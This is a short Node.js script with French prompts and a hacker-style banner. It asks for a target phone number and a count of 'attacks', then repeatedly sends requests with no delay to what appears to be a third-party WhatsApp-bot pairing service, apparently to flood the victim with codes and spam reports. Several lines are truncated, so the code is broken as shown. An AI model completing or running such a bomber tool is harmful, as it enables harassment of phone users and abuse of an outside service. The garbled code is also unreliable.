const readline = require("readline");

const rl = readline.createInterface({
     input: process.stdin,
     output: process.stdout
});

console.log(`\x1b[31m
░██████╗░█████╗░███╗░░░███╗
██╔════╝██╔══██╗████╗░████║
╚█████╗░██║░░╚═╝██╔████╔██║
░╚═══██╗██║░░██╗██║╚██╔╝██║
██████╔╝╚█████╔╝██║░╚═╝░██║
╚═════╝░░╚════╝░╚═╝░░░░░╚═╝\x1b[0m`)
console.log("\x1b[32m by MONSTER S.C.M J.A.P \x1b[0m \n")

rl.question("Entre le numero de la cible.. : ", (reponse) => {
  let nombre = Number(reponse)
  console.log("\x1b[32m NUMERO ECRIT: " + nombre + "\x1b[0m \n");

  rl.question("Entre le nombre d'attaque.. : ", async (reponse2) >
     let nombre2 = Number(reponse2)

     const delai = 0000;

     for(let i = 1; i <= nombre2; i++){
        console.log(`Envoi ${i}/${nombre2}...`);

        try {
            const res = await fetch(`https://prabath-md-pair-web->
            const data = await res.text(); // 4. corrigé

            console.log("\x1b[34mRéponse reçue:\x1b[0m", data);

        } catch(erreur) {
            console.log("\x1b[31mErreur:\x1b[0m", erreur);
        }

        if(i < nombre2){ // 5. corrigé
            await new Promise(resolve => setTimeout(resolve, dela>
        }
     }
    console.log("terminée Aller Signaler La Cible !");
    rl.close();
  });
});
